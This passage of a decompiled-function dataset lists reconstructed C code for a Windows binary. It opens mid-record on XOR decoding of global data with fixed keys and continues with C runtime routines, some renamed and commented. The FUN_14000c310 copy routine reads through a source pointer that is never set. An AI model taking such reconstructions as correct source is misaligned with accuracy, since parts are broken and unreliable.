0xe5e0294ba7b8b0d0;\n_DAT_14003ac60 = _DAT_14003ac60 ^ 0x3f655b8c8e56c319;\n_DAT_14003ac68 = _DAT_14003ac68 ^ 0x9906ab75af2144aa;\n_DAT_14003ac70 = _DAT_14003ac70 ^ 0x78e9a3e0dbe2613;\n_DAT_14003ac78 = _DAT_14003ac78 ^ 0xbbbe2af35618f84;\n_DAT_14003ac80 = _DAT_14003ac80 ^ 0x9d7b465026754bad;\n_DAT_14003ac88 = _DAT_14003ac88 ^ 0x42faa5d98b27b5ee;\n_DAT_14003ac90 = _DAT_14003ac90 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003ac98 = _DAT_14003ac98 ^ 0xdaf257c38fc2fbf8;\n_DAT_14003aba0 = _DAT_14003aba0 ^ 0x55498a9a5733769f;\n_DAT_14003aba8 = _DAT_14003aba8 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003abb0 = _DAT_14003abb0 ^ 0x3f655b8c8e56c319;\n_DAT_14003abb8 = _DAT_14003abb8 ^ 0x9906ab75af2144aa;\n_DAT_14003aca0 = _DAT_14003aca0 ^ 0x55498a9a5733769f;\n_DAT_14003aca8 = _DAT_14003aca8 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003acb0 = _DAT_14003acb0 ^ 0x3f655b8c8e56c319;\n_DAT_14003acb8 = _DAT_14003acb8 ^ 0x9906ab75af2144aa;\n_DAT_14003acc0 = _DAT_14003acc0 ^ 0x78e9a3e0dbe2613;\n_DAT_14003acc8 = _DAT_14003acc8 ^ 0xbbbe2af35618f84;\n_DAT_14003acd0 = _DAT_14003acd0 ^ 0x9d7b465026754bad;\n_DAT_14003acd8 = _DAT_14003acd8 ^ 0x42faa5d98b27b5ee;\n_DAT_14003ace0 = _DAT_14003ace0 ^ 0xf64e27f2d2f2ed67;\n_DAT_14003ace8 = _DAT_14003ace8 ^ 0xdaf257c38fc2fbf8;\n_DAT_14003acf0 = _DAT_14003acf0 ^ 0xe380cce41a50da01;\n_DAT_14003acf8 = _DAT_14003acf8 ^ 0x563b5a2d27541812;\n_DAT_14003ad00 = _DAT_14003ad00 ^ 0x3eaf6a16c9088cbb;\n_DAT_14003ad08 = _DAT_14003ad08 ^ 0xe334bb07ec391f4c;\n_DAT_14003ad10 = _DAT_14003ad10 ^ 0x27a7d2289c366d15;\n_DAT_14003ad18 = _DAT_14003ad18 ^ 0xe0b3d8d1ff7c6b16;\n_DAT_14003abf0 = _DAT_14003abf0 ^ 0x55498a9a5733769f;\n_DAT_14003abf8 = _DAT_14003abf8 ^ 0xe5e0294ba7b8b0d0;\n_DAT_14003ac00 = _DAT_14003ac00 ^ 0x3f655b8c8e56c319;\n_DAT_14003ac08 = _DAT_14003ac08 ^ 0x9906ab75af2144aa;\n_DAT_14003ac10 = _DAT_14003ac10 ^ 0x78e9a3e0dbe2613;\n_DAT_14003ac18 = _DAT_14003ac18 ^ 0xbbbe2af35618f84;\n_DAT_14003ac20 = _DAT_14003ac20 ^ 0x9d7b465026754bad;\n_DAT_14003ac28 = _DAT_14003ac28 ^ 0x42faa5d98b27b5ee;\nreturn uVar4;\n}\nLocal Variable: local_res20 : undefined8\nLocal Variable: local_res18 : undefined8\nLocal Variable: local_res10 : undefined8\nLocal Variable: local_28 : undefined\nLocal Variable: local_38 : undefined8\nLocal Variable: local_40 : undefined8\nLocal Variable: local_48 : undefined8\nLocal Variable: local_50 : undefined8\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined8\nLocal Variable: local_68 : undefined8\nLocal Variable: local_70 : undefined8\nLocal Variable: local_78 : undefined8\nLocal Variable: local_80 : undefined8\nLocal Variable: local_88 : undefined8\nLocal Variable: local_90 : undefined8\nLocal Variable: local_98 : undefined8\nLocal Variable: local_a0 : undefined8\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 : undefined8\nLocal Variable: local_b8 : undefined8\nLocal Variable: local_c0 : undefined8\nLocal Variable: local_c8 : undefined8\nLocal Variable: local_d0 : undefined8\nLocal Variable: local_d8 : undefined8\nLocal Variable: local_e0 : undefined8\nLocal Variable: local_e8 : undefined8\nLocal Variable: local_f0 : undefined8\nLocal Variable: local_f8 : undefined8\nLocal Variable: local_100 : undefined8\nLocal Variable: local_108 : undefined8\nLocal Variable: local_110 : undefined8\nLocal Variable: local_118 : undefined8\nLocal Variable: local_120 : undefined8\nLocal Variable: local_128 : undefined8\nLocal Variable: local_130 : undefined8\nLocal Variable: local_138 : undefined8\nLocal Variable: local_140 : undefined8\nLocal Variable: local_148 : undefined8\nLocal Variable: local_150 : undefined8\nLocal Variable: local_158 : undefined8\nLocal Variable: local_160 : undefined8\nLocal Variable: local_168 : undefined8\nLocal Variable: local_170 : undefined8\nLocal Variable: local_178 : undefined8\nLocal Variable: local_180 : undefined8\nLocal Variable: local_188 : undefined8\nLocal Variable: local_190 : undefined8\nLocal Variable: local_198 : undefined8\nLocal Variable: local_1a0 : undefined8\nLocal Variable: local_1a8 : undefined8\nLocal Variable: local_1b0 : undefined8\nLocal Variable: local_1b8 : undefined8\nLocal Variable: local_1c0 : undefined8\nLocal Variable: local_1c8 : undefined8\nLocal Variable: local_1d0 : undefined8\nLocal Variable: local_1d8 : undefined8\nLocal Variable: local_1e0 : undefined8\nLocal Variable: local_1e8 : undefined8\nLocal Variable: local_1f0 : undefined8\nLocal Variable: local_1f8 : undefined8\nLocal Variable: local_200 : undefined8\nLocal Variable: local_208 : undefined8\nLocal Variable: local_210 : undefined8\nLocal Variable: local_218 : undefined8\nLocal Variable: local_220 : undefined8\nLocal Variable: local_228 : undefined8\nLocal Variable: local_230 : undefined8\nLocal Variable: local_238 : undefined8\nLocal Variable: local_240 : undefined8\nLocal Variable: local_248 : undefined8\nLocal Variable: local_250 : undefined8\nLocal Variable: local_258 : undefined8\nLocal Variable: local_260 : undefined8\nLocal Variable: local_268 : undefined8\nLocal Variable: local_270 : undefined8\nLocal Variable: local_278 : undefined8\nLocal Variable: local_280 : undefined8\nLocal Variable: local_288 : undefined8\nLocal Variable: local_290 : undefined8\nLocal Variable: local_298 : undefined8\nLocal Variable: local_2a0 : undefined8\nLocal Variable: local_2a8 : undefined8\nLocal Variable: local_2b0 : undefined8\nLocal Variable: local_2b8 : undefined8\nLocal Variable: local_2c0 : undefined8\nLocal Variable: local_2c8 : undefined8\nLocal Variable: local_2d0 : undefined8\nLocal Variable: local_2d8 : undefined8\nLocal Variable: local_2e0 : undefined8\nLocal Variable: local_2e8 : undefined8\nLocal Variable: local_2f0 : undefined8\nLocal Variable: local_2f8 : undefined8\nLocal Variable: local_300 : undefined8\nLocal Variable: local_308 : undefined8\nLocal Variable: local_310 : undefined8\nLocal Variable: local_318 : undefined8\nLocal Variable: local_320 : undefined8\nLocal Variable: local_328 : undefined8\nLocal Variable: local_330 : undefined8\nLocal Variable: local_338 : undefined8\nLocal Variable: local_340 : undefined8\nLocal Variable: local_348 : undefined8\nLocal Variable: local_350 : undefined8\nLocal Variable: local_358 : undefined8\nLocal Variable: local_360 : undefined8\nLocal Variable: local_368 : undefined8\nLocal Variable: local_370 : undefined8\nLocal Variable: local_378 : undefined8\nLocal Variable: local_380 : undefined8\nLocal Variable: local_388 : undefined8\nLocal Variable: local_390 : undefined8\nLocal Variable: local_398 : undefined8\nLocal Variable: local_3b0 : undefined1[16]\nLocal Variable: local_3c0 : undefined8\nLocal Variable: local_3d0 : undefined1[16]\nLocal Variable: local_3e0 : undefined8\nLocal Variable: local_3f0 : undefined1[16]\nLocal Variable: local_400 : undefined8\nLocal Variable: local_410 : undefined1[16]\nLocal Variable: local_420 : undefined8\nLocal Variable: local_430 : undefined1[16]\nLocal Variable: local_440 : undefined8\nLocal Variable: local_448 : undefined8"}
{"Function Name": "__uncaught_exception", "Address": "140009b80", "Source Code": "bool __uncaught_exception(void)\n{\n    \n    longlong threadDataPointer = __vcrt_getptd_noinit();\n    \n    \n    return threadDataPointer != 0 && 0 < *(int *)(threadDataPointer + 0x30);\n}"}
{"Function Name": "__wcsnicmp_ascii", "Address": "14000aa4c", "Source Code": "int __wcsnicmp_ascii(longlong base_string, ushort *comparison_string, longlong char_count)\n{\n    ushort first_char, second_char; \n    int comparison_result = 0; \n    longlong offset; \n    if (char_count != 0) { \n        offset = base_string - (longlong)comparison_string; \n        do {\n            first_char = *(short *)(offset + (longlong)comparison_string); \n            if (0x19 < (ushort)(first_char - 0x41U)) { \n                first_char += 0x20; \n            }\n            second_char = *comparison_string; \n            if (0x19 < (ushort)(second_char - 0x41)) { \n                second_char += 0x20; \n            }\n            comparison_string++; \n            char_count--; \n        } while ((char_count != 0) && (first_char != 0) && (first_char == second_char)); \n        comparison_result = (uint)first_char - (uint)second_char; \n    }\n    return comparison_result; \n}"}
{"Function Name": "FUN_14000c310", "Address": "14000c310", "Source Code": "void FUN_14000c310(undefined1 *destination, undefined8 data_length, longlong count)\n{\n    undefined1 *source; \n    \n    while (count-- != 0) {\n        *destination++ = *source++; \n    }\n}"}
{"Function Name": "FUN_14000c720", "Address": "14000c720", "Source Code": "void FUN_14000c720(undefined1 *destination, undefined1 value, longlong count)\n{\n    \n    while (count--) {\n        \n        *destination++ = value;\n    }\n}"}
{"Function Name": "__uncaught_exception", "Address": "14000c8d0", "Source Code": "bool __uncaught_exception(void)\n{\n    \n    longlong threadDataPointer = __vcrt_getptd_noinit();\n    \n    \n    return threadDataPointer != 0 && 0 < *(int *)(threadDataPointer + 0x30);\n}"}
{"Function Name": "FUN_14000d328", "Address": "14000d328", "Source Code": "void FUN_14000d328(EHExceptionRecord *param_1,__uint64 *param_2,_CONTEXT *param_3,\n_xDISPATCHER_CONTEXT *param_4,_s_FuncInfo *param_5,byte param_6,int param_7,\n__uint64 *param_8)\n{\nundefined8 *puVar1;\n_s_ESTypeList *p_Var2;\nlonglong lVar3;\ncode *pcVar4;\nuint uVar5;\nbool bVar6;\nchar cVar7;\nuchar uVar8;\nbool bVar9;\nint iVar10;\nint iVar11;\nlonglong lVar12;\nint *piVar13;\nundefined8 uVar14;\n__uint64 *p_Var15;\nuint uVar16;\nulonglong uVar17;\nuint uVar18;\nundefined1 auStackY_168 [32];\n_s_TryBlockMapEntry *in_stack_fffffffffffffed0;\nundefined4 uVar19;\nuchar local_107;\n_CONTEXT *local_100;\n_s_CatchableType *local_d8;\nlonglong local_d0;\n_s_TryBlockMapEntry local_c8;\n_s_FuncInfo *local_b0;\nundefined8 local_a8;\nundefined4 local_a0;\nundefined4 uStack_9c;\nuint uStack_98;\nundefined4 uStack_94;\nundefined4 local_90;\nundefined4 uStack_8c;\nuint uStack_88;\nundefined4 uStack_84;\nuint local_78;\n_s_HandlerType local_70;\nulonglong local_58;\nlocal_58 = DAT_140038080 ^ (ulonglong)auStackY_168;\nbVar9 = false;\nlocal_107 = '\\0';\nbVar6 = false;\niVar10 = __FrameHandler3::GetHandlerSearchState(param_2,param_4,param_5);\nif ((iVar10 < -1) || (param_5->maxState <= iVar10)) goto LAB_14000d7fd;\nlocal_100 = param_3;\nif ((*(int *)param_1 == -0x1f928c9d) &&\n(((*(int *)(param_1 + 0x18) == 4 && (*(int *)(param_1 + 0x20) + 0xe66cfae0U < 3)) &&\n(*(longlong *)(param_1 + 0x30) == 0)))) {\nlVar12 = __vcrt_getptd();\nif (*(longlong *)(lVar12 + 0x20) == 0) goto LAB_14000d7b9;\nlVar12 = __vcrt_getptd();\nparam_1 = *(EHExceptionRecord **)(lVar12 + 0x20);\nlVar12 = __vcrt_getptd();\nlocal_107 = '\\x01';\nlocal_100 = *(_CONTEXT **)(lVar12 + 0x28);\nFUN_14000bf88(*(undefined8 *)(param_1 + 0x38));\nif (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x18) == 4)) &&\n((*(int *)(param_1 + 0x20) + 0xe66cfae0U < 3 && (*(longlong *)(param_1 + 0x30) == 0))))\ngoto LAB_14000d7fd;\nlVar12 = __vcrt_getptd();\nif (*(longlong *)(lVar12 + 0x38) != 0) {\nlVar12 = __vcrt_getptd();\np_Var2 = *(_s_ESTypeList **)(lVar12 + 0x38);\nlVar12 = __vcrt_getptd();\n*(undefined8 *)(lVar12 + 0x38) = 0;\ncVar7 = FUN_14000e298((longlong)param_1,(int *)p_Var2);\nif (cVar7 == '\\0') {\nuVar8 = Is_bad_exception_allowed(p_Var2);\nif (uVar8 != '\\0') {\n__DestructExceptionObject((int *)param_1);\nFUN_14000dde0((undefined8 *)&local_70);\nFUN_14000c234((longlong *)&local_70,&DAT_140036118);\npcVar4 = (code *)swi(3);\n(*pcVar4)();\nreturn;\n}\ngoto LAB_14000d7fd;\n}\n}\n}\nuVar19 = (undefined4)((ulonglong)in_stack_fffffffffffffed0 >> 0x20);\nlocal_a8 = *(undefined8 *)(param_4 + 8);\nlocal_b0 = param_5;\nif (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x18) == 4)) &&\n(*(int *)(param_1 + 0x20) + 0xe66cfae0U < 3)) {\nif (param_5->nTryBlocks != 0) {\nFUN_14000bc54((undefined8 *)&local_90,&local_b0,iVar10,param_4,param_5);\nuVar19 = (undefined4)((ulonglong)in_stack_fffffffffffffed0 >> 0x20);\nlocal_a0 = local_90;\nuStack_9c = uStack_8c;\nuStack_98 = uStack_88;\nuStack_94 = uStack_84;\nif (uStack_88 < local_78) {\nuVar18 = uStack_88;\ndo {\nlVar3 = *(longlong *)(CONCAT44(uStack_8c,local_90) + 8);\nlVar12 = (longlong)*(int *)(*(longlong *)CONCAT44(uStack_9c,local_a0) + 0x10) +\n(ulonglong)uVar18 * 0x14;\npiVar13 = (int *)(lVar12 + lVar3);\nlocal_c8.tryLow = *piVar13;\nlocal_c8.tryHigh = piVar13[1];\nlocal_c8.catchHigh = piVar13[2];\nuVar5 = piVar13[3];\nlocal_c8.dispHandlerArray = *(int *)(lVar12 + 0x10 + lVar3);\nlocal_c8.nCatches = uVar5;\nif ((local_c8.tryLow <= iVar10) && (iVar10 <= local_c8.tryHigh)) {\nlocal_d0 = (longlong)local_c8.dispHandlerArray + *(longlong *)(param_4 + 8);\nuVar17 = 0;\nbVar9 = bVar6;\nif (uVar5 != 0) {\ndo {\npuVar1 = (undefined8 *)(local_d0 + uVar17 * 0x14);\nlocal_70._0_8_ = *puVar1;\nlocal_70._8_8_ = puVar1[1];\nlocal_70.dispFrame = *(dword *)(local_d0 + 0x10 + uVar17 * 0x14);\nlVar12 = _GetThrowImageBase();\npiVar13 = (int *)(lVar12 + 4 +\n(longlong)*(int *)(*(longlong *)(param_1 + 0x30) + 0xc));\nlVar12 = _GetThrowImageBase();\nfor (iVar11 = *(int *)(lVar12 + *(int *)(*(longlong *)(param_1 + 0x30) + 0xc));\n0 < iVar11; iVar11 = iVar11 + -1) {\nlVar12 = _GetThrowImageBase();\nlocal_d8 = (_s_CatchableType *)(lVar12 + *piVar13);\nuVar14 = TypeMatchHelper<>((byte *)&local_70,(byte *)local_d8,\n*(byte **)(param_1 + 0x30));\nif ((int)uVar14 != 0) {\nin_stack_fffffffffffffed0 = &local_c8;\nbVar6 = true;\nCatchIt<class___FrameHandler3>\n(param_1,param_2,local_100,param_4,param_5,&local_70,local_d8,\nin_stack_fffffffffffffed0,param_7,param_8,local_107,param_6);\nbVar9 = bVar6;\ngoto LAB_14000d683;\n}\npiVar13 = piVar13 + 1;\n}\nuVar16 = (int)uVar17 + 1;\nuVar17 = (ulonglong)uVar16;\n} while (uVar16 != uVar5);\n}\n}\nLAB_14000d683:\nuVar19 = (undefined4)((ulonglong)in_stack_fffffffffffffed0 >> 0x20);\nuVar18 = uVar18 + 1;\n} while (uVar18 < local_78);\nif (bVar9) goto LAB_14000d7ad;\n}\n}\nif (0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff)) {\nif (param_5->dispESTypeList == 0) {\nlVar12 = 0;\n}\nelse {\nlVar12 = _GetImageBase();\nlVar12 = lVar12 + (int)param_5->dispESTypeList;\n}\nif ((lVar12 != 0) ||\n((((uint)param_5->EHFlags >> 2 & 1) != 0 &&\n(bVar9 = __FrameHandler3::ExecutionInCatch(param_4,param_5), !bVar9)))) {\nif (((uint)param_5->EHFlags >> 2 & 1) != 0) goto LAB_14000d7fd;\nif (param_5->dispESTypeList == 0) {\npiVar13 = (int *)0x0;\n}\nelse {\nlVar12 = _GetImageBase();\npiVar13 = (int *)(lVar12 + (int)param_5->dispESTypeList);\n}\ncVar7 = FUN_14000e298((longlong)param_1,piVar13);\nif (cVar7 == '\\0') {\np_Var15 = __FrameHandler3::GetEstablisherFrame\n(param_2,param_4,param_5,(__uint64 *)&local_d8);\nFUN_14000bd94(param_2,(ULONG_PTR)param_1,(ULONG_PTR)local_100,(ULONG_PTR)p_Var15,0,\n(ULONG_PTR)param_5,-1,CONCAT44(uVar19,0xffffffff),0,(undefined8 *)param_4,\nparam_6);\n}\n}\n}\n}\nelse if (param_5->nTryBlocks != 0) {\nif (param_6 != 0) goto LAB_14000d7fd;\nFUN_14000d804(param_1,param_2,local_100,param_4,param_5,iVar10,param_7,param_8);\n}\nLAB_14000d7ad:\nlVar12 = __vcrt_getptd();\nif (*(longlong *)(lVar12 + 0x38) == 0) {\nLAB_14000d7b9:\n__security_check_cookie(local_58 ^ (ulonglong)auStackY_168);\nreturn;\n}\nLAB_14000d7fd:\nterminate();\npcVar4 = (code *)swi(3);\n(*pcVar4)();\nreturn;\n}\nLocal Variable: local_58 : undefined8\nLocal Variable: local_60 : undefined4\nLocal Variable: local_70 : undefined1[16]\nLocal Variable: local_78 : undefined4\nLocal Variable: local_90 : undefined1[16]\nLocal Variable: local_a0 : undefined1[16]\nLocal Variable: local_a8 : undefined8\nLocal Variable: local_b0 : undefined8\nLocal Variable: local_b8 : undefined4\nLocal Variable: local_c8 : undefined1[16]\nLocal Variable: local_d0 : undefined8\nLocal Variable: local_d8 : undefined8\nLocal Variable: local_e0 : undefined8\nLocal Variable: local_e8 : undefined8\nLocal Variable: local_f0 : undefined8\nLocal Variable: local_f8 : undefined8\nLocal Variable: local_100 : undefined8\nLocal Variable: local_104 : undefined4\nLocal Variable: local_107 : undefined1\nLocal Variable: local_108 : undefined1\nLocal Variable: local_110 : undefined1\nLocal Variable: local_118 : undefined1\nLocal Variable: local_120 : undefined8\nLocal Variable: local_128 : undefined8\nLocal Variable: local_130 : undefined8\nLocal Variable: local_138 : undefined8\nLocal Variable: local_140 : undefined8\nLocal Variable: local_148 : undefined8"}
{"Function Name": "__acrt_errno_from_os_error", "Address": "14000faf0", "Source Code": "undefined4 __acrt_errno_from_os_error(int error_code)\n{\n    ulonglong index = 0; \n    int *error_code_ptr = &error_code_array; \n    do {\n        if (error_code == *error_code_ptr) { \n            return *(undefined4 *)(&error_value_array + index * 8); \n        }\n        index++; \n        error_code_ptr += 2; \n    } while (index < 0x2d); \n    if (error_code - 0x13U < 0x12) { \n        return 0xd; \n    }\n    \n    return (error_code - 0xbcU < 0xf) ? 8 : 0x16; \n}"}
{"Function Name": "_expandlocale", "Address": "140013bc8", "Source Code": "void _expandlocale(wchar_t *param_1,wchar_t *param_2,rsize_t param_3,wchar_t *param_4,\nrsize_t param_5,UINT *param_6)\n{\nrsize_t _MaxCount;\nwchar_t *_Dst;\nwchar_t wVar1;\nwchar_t wVar2;\nUINT *pUVar3;\nbool bVar4;\nerrno_t eVar5;\nint iVar6;\nlonglong lVar7;\nwchar_t *pwVar8;\nundefined8 uVar9;\nlonglong lVar10;\nulonglong uVar11;\nundefined1 auStackY_288 [32];\nuint local_258 [2];\nUINT *local_250;\nwchar_t *local_248;\nwchar_t *local_240;\nwchar_t *local_238;\nrsize_t local_230;\nWCHAR local_228 [128];\nwchar_t local_128 [16];\nwchar_t local_108 [88];\nulonglong local_58;\nulonglong uVar12;\nlocal_58 = DAT_140038080 ^ (ulonglong)auStackY_288;\nlocal_238 = param_2;\nlocal_230 = param_3;\nif (param_1 == (wchar_t *)0x0) goto LAB_140013e43;\nlVar7 = __acrt_getptd();\nlocal_258[0] = 0;\nlocal_250 = (UINT *)(lVar7 + 0xb8);\n_Dst = (wchar_t *)(lVar7 + 0x1c2);\nlocal_248 = (wchar_t *)(lVar7 + 0xbc);\nlocal_240 = (wchar_t *)(lVar7 + 0x2f0);\neVar5 = wcsncpy_s(param_4,param_5,local_240,0x55);\nif (eVar5 != 0) goto LAB_140013f80;\nif ((*param_1 == L'C') && (param_1[1] == L'\\0')) {\neVar5 = wcscpy_s(param_2,param_3,L\"C\");\nif (eVar5 == 0) {\nif (param_6 != (UINT *)0x0) {\n*param_6 = 0;\n}\ngoto LAB_140013e43;\n}\ngoto LAB_140013f80;\n}\nlVar7 = -1;\nuVar11 = 0xffffffffffffffff;\ndo {\nuVar12 = uVar11;\nuVar11 = uVar12 + 1;\n} while (param_1[uVar11] != L'\\0');\nif (uVar11 < 0x83) {\npwVar8 = _Dst;\ndo {\nwVar1 = *pwVar8;\nwVar2 = *(wchar_t *)((longlong)pwVar8 + ((longlong)param_1 - (longlong)_Dst));\nif (wVar1 != wVar2) break;\npwVar8 = pwVar8 + 1;\n} while (wVar2 != L'\\0');\nif (wVar1 != wVar2) {\npwVar8 = local_248;\ndo {\nwVar1 = *pwVar8;\nwVar2 = *(wchar_t *)((longlong)pwVar8 + ((longlong)param_1 - (longlong)local_248));\nif (wVar1 != wVar2) break;\npwVar8 = pwVar8 + 1;\n} while (wVar2 != L'\\0');\nif (wVar1 != wVar2) goto LAB_140013d11;\n}\n}\nelse {\nLAB_140013d11:\nbVar4 = __acrt_can_use_vista_locale_apis();\nuVar9 = __lc_wcstolc((undefined1 (*) [16])local_228,param_1);\npUVar3 = local_250;\nif ((int)uVar9 == 0) {\nif (bVar4) {\nuVar9 = __acrt_get_qualified_locale(local_228,local_250,local_228);\niVar6 = (int)uVar9;\n}\nelse {\niVar6 = __acrt_get_qualified_locale_downlevel((longlong)local_228,local_250,local_228);\n}\nif (iVar6 == 0) goto LAB_140013db8;\n__lc_lctowcs(_Dst,0x83,local_228);\nif (param_4 != (wchar_t *)0x0) {\ndo {\nlVar10 = lVar7;\nlVar7 = lVar10 + 1;\n} while (local_108[lVar7] != L'\\0');\niVar6 = wcsncpy_s(param_4,param_5,local_108,lVar10 + 2);\ngoto joined_r0x000140013eef;\n}\n}\nelse {\nLAB_140013db8:\nif (((0x82 < uVar11) || (local_228[0] == L'\\0')) ||\n(iVar6 = __acrt_IsValidLocaleName(local_228), iVar6 == 0)) {\ndo {\nlVar10 = lVar7;\nlVar7 = lVar10 + 1;\n} while (param_4[lVar7] != L'\\0');\niVar6 = wcsncpy_s(local_240,0x55,param_4,lVar10 + 2);\nLAB_140013e39:\nif (iVar6 != 0) goto LAB_140013f95;\ngoto LAB_140013e43;\n}\nif (local_128[0] == L'\\0') {\niVar6 = __acrt_GetLocaleInfoEx(param_1,0x20001004,(LPWSTR)local_258,2);\nif ((iVar6 == 0) || (local_258[0] == 0)) goto LAB_140013e8a;\n}\nelse {\niVar6 = _wcsicmp(local_128,L\"utf8\");\nif ((iVar6 != 0) && (iVar6 = _wcsicmp(local_128,L\"utf-8\"), iVar6 != 0)) {\ndo {\nlVar10 = lVar7;\nlVar7 = lVar10 + 1;\n} while (param_4[lVar7] != L'\\0');\niVar6 = wcsncpy_s(local_240,0x55,param_4,lVar10 + 2);\ngoto LAB_140013e39;\n}\nLAB_140013e8a:\nlocal_258[0] = 0xfde9;\n}\n_MaxCount = uVar12 + 2;\n*pUVar3 = local_258[0] & 0xffff;\neVar5 = wcsncpy_s(_Dst,0x83,param_1,_MaxCount);\nif ((eVar5 != 0) || (eVar5 = wcsncpy_s(param_4,param_5,param_1,_MaxCount), eVar5 != 0))\ngoto LAB_140013f95;\niVar6 = wcsncpy_s(local_240,0x55,local_228,_MaxCount);\njoined_r0x000140013eef:\nif (iVar6 != 0) goto LAB_140013f95;\n}\nif ((*param_1 == L'\\0') || (0x82 < uVar11)) {\n*local_248 = L'\\0';\nparam_2 = local_238;\n}\nelse {\neVar5 = wcsncpy_s(local_248,0x83,param_1,uVar12 + 2);\nparam_2 = local_238;\nif (eVar5 != 0) {\nLAB_140013f95:\n_invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);\n}\n}\n}\nif (param_6 != (UINT *)0x0) {\n*param_6 = *local_250;\n}\neVar5 = wcscpy_s(param_2,local_230,_Dst);\nif (eVar5 != 0) {\nLAB_140013f80:\n_invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);\n}\nLAB_140013e43:\n__security_check_cookie(local_58 ^ (ulonglong)auStackY_288);\nreturn;\n}\nLocal Variable: local_58 : undefined8\nLocal Variable: local_108 : undefined\nLocal Variable: local_128 : undefined2\nLocal Variable: local_188 : undefined\nLocal Variable: local_228 : undefined2\nLocal Variable: local_230 : undefined8\nLocal Variable: local_238 : undefined8\nLocal Variable: local_240 : undefined8\nLocal Variable: local_248 : undefined8\nLocal Variable: local_250 : undefined8\nLocal Variable: local_258 : undefined4\nLocal Variable: local_268 : undefined8"}
{"Function Name": "_wcstombs_l_helper", "Address": "140016534", "Source Code": "__uint64 __cdecl\n_wcstombs_l_helper(char *param_1,wchar_t *param_2,__uint64 param_3,__crt_locale_pointers *param_4)\n{\nchar cVar1;\nwchar_t wVar2;\nWCHAR WVar3;\nuint uVar4;\nint iVar5;\nDWORD DVar6;\nulong *puVar7;\nLPCWSTR pWVar8;\n__uint64 extraout_RAX;\n__uint64 _Var9;\nulonglong uVar10;\nWCHAR *pWVar11;\nulonglong uVar12;\nulonglong uVar13;\nulonglong uVar14;\nundefined1 auStackY_c8 [32];\nBOOL local_88 [2];\nwchar_t *local_80;\nundefined8 local_78;\nlonglong local_70;\nlonglong local_68;\nchar local_58;\nundefined8 local_50;\nCHAR local_48 [8];\nulonglong local_40;\nlocal_50 = 0xfffffffffffffffe;\nlocal_40 = DAT_140038080 ^ (ulonglong)auStackY_c8;\nuVar13 = 0;\nlocal_88[0] = 0;\nlocal_80 = param_2;\nif ((param_1 != (char *)0x0) && (param_3 == 0)) goto LAB_14001687d;\nif (param_2 == (wchar_t *)0x0) {\npuVar7 = __doserrno();\n*puVar7 = 0x16;\nFUN_14000ecf8();\ngoto LAB_14001687d;\n}\n_LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_70,param_4);\nuVar4 = *(uint *)(local_68 + 0xc);\nif (uVar4 == 0xfde9) {\nlocal_78 = 0;\n__crt_mbstring::__wcsrtombs_utf8(param_1,&local_80,param_3,(_Mbstatet *)&local_78);\n}\nelse if (param_1 == (char *)0x0) {\nif (*(longlong *)(local_68 + 0x138) == 0) {\nWVar3 = *local_80;\npWVar11 = local_80;\nwhile (WVar3 != L'\\0') {\nif (0xff < (ushort)WVar3) {\npuVar7 = __doserrno();\n*puVar7 = 0x2a;\nbreak;\n}\npWVar11 = pWVar11 + 1;\nWVar3 = *pWVar11;\n}\n}\nelse {\niVar5 = __acrt_WideCharToMultiByte(uVar4,0,local_80,-1,(LPSTR)0x0,0,(LPBOOL)0x0,local_88);\nif (iVar5 != 0) {\njoined_r0x0001400166f3:\nif (local_88[0] == 0) goto LAB_140016869;\n}\nLAB_14001685b:\npuVar7 = __doserrno();\nLAB_140016860:\n*puVar7 = 0x2a;\n}\n}\nelse if (*(longlong *)(local_68 + 0x138) == 0) {\nif (param_3 != 0) {\ndo {\nif (0xff < (ushort)*local_80) goto LAB_140016633;\nparam_1[uVar13] = (char)*local_80;\nwVar2 = *local_80;\nlocal_80 = local_80 + 1;\n} while ((wVar2 != L'\\0') && (uVar13 = uVar13 + 1, uVar13 < param_3));\n}\n}\nelse if (*(int *)(local_68 + 8) == 1) {\npWVar8 = local_80;\n_Var9 = param_3;\nif (param_3 != 0) {\ndo {\nif (*pWVar8 == L'\\0') break;\npWVar8 = pWVar8 + 1;\n_Var9 = _Var9 - 1;\n} while (_Var9 != 0);\nif ((_Var9 != 0) && (*pWVar8 == L'\\0')) {\nparam_3 = ((longlong)pWVar8 - (longlong)local_80 >> 1) + 1;\n}\n}\niVar5 = __acrt_WideCharToMultiByte\n(uVar4,0,local_80,(int)param_3,param_1,(int)param_3,(LPBOOL)0x0,local_88);\nif ((iVar5 == 0) || (local_88[0] != 0)) {\nLAB_140016633:\npuVar7 = __doserrno();\ngoto LAB_140016860;\n}\n}\nelse {\niVar5 = __acrt_WideCharToMultiByte\n(uVar4,0,local_80,-1,param_1,(int)param_3,(LPBOOL)0x0,local_88);\nuVar14 = (ulonglong)iVar5;\nif (iVar5 != 0) goto joined_r0x0001400166f3;\nif ((local_88[0] != 0) || (DVar6 = GetLastError(), DVar6 != 0x7a)) goto LAB_14001685b;\nif (param_3 != 0) {\ndo {\niVar5 = *(int *)(local_68 + 8);\nif (5 < *(int *)(local_68 + 8)) {\niVar5 = 5;\n}\niVar5 = __acrt_WideCharToMultiByte\n(*(uint *)(local_68 + 0xc),0,local_80,1,local_48,iVar5,(LPBOOL)0x0,\nlocal_88);\nif ((((iVar5 == 0) || (local_88[0] != 0)) || (iVar5 < 0)) ||\n(uVar12 = (ulonglong)iVar5, 5 < uVar12)) goto LAB_14001685b;\nif (param_3 < uVar12 + uVar14) break;\nuVar10 = uVar13;\nif (0 < (longlong)uVar12) {\ndo {\ncVar1 = local_48[uVar10];\nparam_1[uVar14] = cVar1;\nif (cVar1 == '\\0') goto LAB_140016869;\nuVar10 = uVar10 + 1;\nuVar14 = uVar14 + 1;\n} while ((longlong)uVar10 < (longlong)uVar12);\n}\nlocal_80 = local_80 + 1;\n} while (uVar14 < param_3);\n}\n}\nLAB_140016869:\nif (local_58 != '\\0') {\n*(uint *)(local_70 + 0x3a8) = *(uint *)(local_70 + 